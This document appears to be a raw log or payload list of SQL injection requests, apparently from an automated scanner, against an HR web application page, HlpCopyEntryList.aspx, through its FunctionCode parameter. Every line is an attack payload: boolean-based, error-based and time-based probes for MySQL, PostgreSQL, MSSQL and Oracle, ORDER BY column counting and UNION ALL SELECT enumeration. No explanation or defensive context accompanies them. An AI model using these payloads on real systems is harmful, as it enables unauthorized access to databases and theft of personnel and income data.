+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate]),)),'"')
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4516=6123 AND ('BWQW'='BWQW
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 2861=2861 AND ('xFgd'='xFgd
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 6527=3394 AND 'IYYz'='IYYz
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 2861=2861 AND 'ZfvH'='ZfvH
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 1456=7628 AND 'ILzL'='ILzL
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2101=3100 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2861=2861 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 5791=2516 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND (SELECT 3569 FROM(SELECT COUNT(*),CONCAT(0x3a76676a3a,(SELECT (CASE WHEN (3569=3569) THEN 1 ELSE 0 END)),0x3a76636b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('OTaC'='OTaC
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND (SELECT 3569 FROM(SELECT COUNT(*),CONCAT(0x3a76676a3a,(SELECT (CASE WHEN (3569=3569) THEN 1 ELSE 0 END)),0x3a76636b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'JgeK'='JgeK
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND (SELECT 3569 FROM(SELECT COUNT(*),CONCAT(0x3a76676a3a,(SELECT (CASE WHEN (3569=3569) THEN 1 ELSE 0 END)),0x3a76636b3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4214=CAST((CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58))||(SELECT (CASE WHEN (4214=4214) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)) AS NUMERIC) AND ('iRvo'='iRvo
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4214=CAST((CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58))||(SELECT (CASE WHEN (4214=4214) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)) AS NUMERIC) AND 'SBop'='SBop
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4214=CAST((CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58))||(SELECT (CASE WHEN (4214=4214) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 8008=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(103)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (8008=8008) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(118)+CHAR(99)+CHAR(107)+CHAR(58))) AND ('lCZt'='lCZt
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 8008=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(103)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (8008=8008) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(118)+CHAR(99)+CHAR(107)+CHAR(58))) AND 'FoUM'='FoUM
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 8008=CONVERT(INT,(CHAR(58)+CHAR(118)+CHAR(103)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (8008=8008) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(118)+CHAR(99)+CHAR(107)+CHAR(58))) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4531=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58)||(SELECT (CASE WHEN (4531=4531) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND ('scqC'='scqC
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4531=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58)||(SELECT (CASE WHEN (4531=4531) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND 'nQEv'='nQEv
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4531=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58)||(SELECT (CASE WHEN (4531=4531) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND SLEEP(5) AND ('aBct'='aBct
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND SLEEP(5) AND 'AWMD'='AWMD
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 8347=(SELECT 8347 FROM PG_SLEEP(5)) AND ('pSpG'='pSpG
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 8347=(SELECT 8347 FROM PG_SLEEP(5)) AND 'BeoO'='BeoO
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 8347=(SELECT 8347 FROM PG_SLEEP(5)) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 5108=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(120)||CHR(113)||CHR(77),5) AND ('XMZB'='XMZB
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 5108=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(120)||CHR(113)||CHR(77),5) AND 'Pjvg'='Pjvg
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 5108=DBMS_PIPE.RECEIVE_MESSAGE(CHR(70)||CHR(120)||CHR(113)||CHR(77),5) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 4859-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 10-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 6-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 8-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 9-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'OboTNsPhYE',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,'NHjldNdXWc',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 'nQZunBDaTf',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,'ATWpUvNVTL',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'EeYbtTXELk',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'ETBPFMfBXf'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,'QeCFNtkvVa',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,'iVoOeGGqGU',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'mqeBgboOOO',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-2673' UNION ALL SELECT NULL,NULL,NULL,'XqWrIvIEwi',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7994' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'oKpnVNraUr',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1461' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'VEJpCCyZHc',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1112' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'cJPlBHOOyr'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1055' UNION ALL SELECT NULL,'FCaYlrIzZL',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1315' UNION ALL SELECT NULL,NULL,NULL,NULL,'FhigyRwUjb',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-4519' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'BnwJmGpcrq',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6642' UNION ALL SELECT 'uXvyaWAmdP',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1401' UNION ALL SELECT NULL,NULL,'ikoasXkCRG',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,87,87,'clPzYxmCLm',87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,87,'tRJQjqXXlS',87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,87,87,87,87,87,87,'xXFGKxMigm'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,'KoAJYwZRVu',87,87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,87,87,87,87,'zOoeJHdrtR',87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,87,87,87,'swNeDFQWgF',87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 'RGATdRDBnA',87,87,87,87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,87,87,87,87,87,87,'ZvugqkgHBl',87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 87,'giPDVoioqj',87,87,87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1707' UNION ALL SELECT 87,87,87,87,'xdbXkARqxQ',87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6674' UNION ALL SELECT 87,87,87,87,87,87,'OrldltovuM',87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6684' UNION ALL SELECT 'rlwTksAktf',87,87,87,87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7939' UNION ALL SELECT 87,'ErQOkovoht',87,87,87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6592' UNION ALL SELECT 87,87,87,'BvTwtSFTvG',87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1407' UNION ALL SELECT 87,87,87,87,87,87,87,'gvqxdJbgpd',87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1560' UNION ALL SELECT 87,87,'iOgTSndsqM',87,87,87,87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-8460' UNION ALL SELECT 87,87,87,87,87,'cPlDUluPNu',87,87,87-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-2828' UNION ALL SELECT 87,87,87,87,87,87,87,87,'eMvsKyeVZE'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'jIiEsLNymj',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,'FaAcoVmZKi',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,'OrTNLGQsiu',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,'KtinldUSEl',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'WeWDwORsfq'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT 'izkPtXjEZD',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'FSYUWTmHdK',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,'FiWZCEZmli',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'pTeEMnILHL',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-7966%' UNION ALL SELECT NULL,NULL,NULL,NULL,'RGqmeyprPl',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-4411%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'eGITNkQZRb'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-1505%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'qJqMaUOHqC',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6900%' UNION ALL SELECT NULL,NULL,'mtQoKerQLO',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-2572%' UNION ALL SELECT NULL,NULL,NULL,'djdaBJbFCa',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-5014%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'VMBoTMJjVh',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-3505%' UNION ALL SELECT 'NtJVDnLJKQ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-5607%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'UDOvQEoueX',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-6410%' UNION ALL SELECT NULL,'nAUgurIfYN',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' or '1'='1
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate'[]([,,.."
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 9354=6232 AND ('ztVP'='ztVP
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 8932=8932 AND ('wYzW'='wYzW
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4029=8663 AND 'FHkp'='FHkp
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 8932=8932 AND 'ZOEy'='ZOEy
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 5377=9422 AND 'XOZp'='XOZp
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 1892=2766 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 8932=8932 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 3358=7282 AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND (SELECT 1376 FROM(SELECT COUNT(*),CONCAT(0x3a6a71643a,(SELECT (CASE WHEN (1376=1376) THEN 1 ELSE 0 END)),0x3a706d693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ('IaRQ'='IaRQ
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND (SELECT 1376 FROM(SELECT COUNT(*),CONCAT(0x3a6a71643a,(SELECT (CASE WHEN (1376=1376) THEN 1 ELSE 0 END)),0x3a706d693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'GnDk'='GnDk
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND (SELECT 1376 FROM(SELECT COUNT(*),CONCAT(0x3a6a71643a,(SELECT (CASE WHEN (1376=1376) THEN 1 ELSE 0 END)),0x3a706d693a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 9883=CAST((CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (9883=9883) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)) AS NUMERIC) AND ('PsJQ'='PsJQ
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 9883=CAST((CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (9883=9883) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)) AS NUMERIC) AND 'jdrN'='jdrN
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 9883=CAST((CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (9883=9883) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)) AS NUMERIC) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 5463=CONVERT(INT,(CHAR(58)+CHAR(106)+CHAR(113)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (5463=5463) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(112)+CHAR(109)+CHAR(105)+CHAR(58))) AND ('bpYH'='bpYH
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 5463=CONVERT(INT,(CHAR(58)+CHAR(106)+CHAR(113)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (5463=5463) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(112)+CHAR(109)+CHAR(105)+CHAR(58))) AND 'hgJb'='hgJb
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 5463=CONVERT(INT,(CHAR(58)+CHAR(106)+CHAR(113)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (5463=5463) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(112)+CHAR(109)+CHAR(105)+CHAR(58))) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 6888=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (6888=6888) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)||CHR(62))) FROM DUAL) AND ('XgQN'='XgQN
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 6888=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (6888=6888) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)||CHR(62))) FROM DUAL) AND 'XZLG'='XZLG
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 6888=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (6888=6888) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)||CHR(62))) FROM DUAL) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND SLEEP(5) AND ('Rbfz'='Rbfz
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND SLEEP(5) AND 'pObP'='pObP
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 2061=(SELECT 2061 FROM PG_SLEEP(5)) AND ('maVx'='maVx
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 2061=(SELECT 2061 FROM PG_SLEEP(5)) AND 'rrmi'='rrmi
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 2061=(SELECT 2061 FROM PG_SLEEP(5)) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate') AND 4931=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(120)||CHR(111)||CHR(98),5) AND ('iYUj'='iYUj
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' AND 4931=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(120)||CHR(111)||CHR(98),5) AND 'aPlB'='aPlB
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate%' AND 4931=DBMS_PIPE.RECEIVE_MESSAGE(CHR(113)||CHR(120)||CHR(111)||CHR(98),5) AND '%'='
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' ORDER BY 7087-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT 'XfNTAeccwS',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,'asGPOhfagC',NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,'rxVAmhvaxM',NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'YyiPANAXsP'-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,'ozyPHnkSxx',NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'iqNXqoMUGl',NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,'KbJUMlNoir',NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,'tfdkLLSNEF',NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate' UNION ALL SELECT NULL,NULL,'ZCGAfOEuqo',NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=-2402' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,'TfRdZADMQE',NULL,NULL,NULL-- 
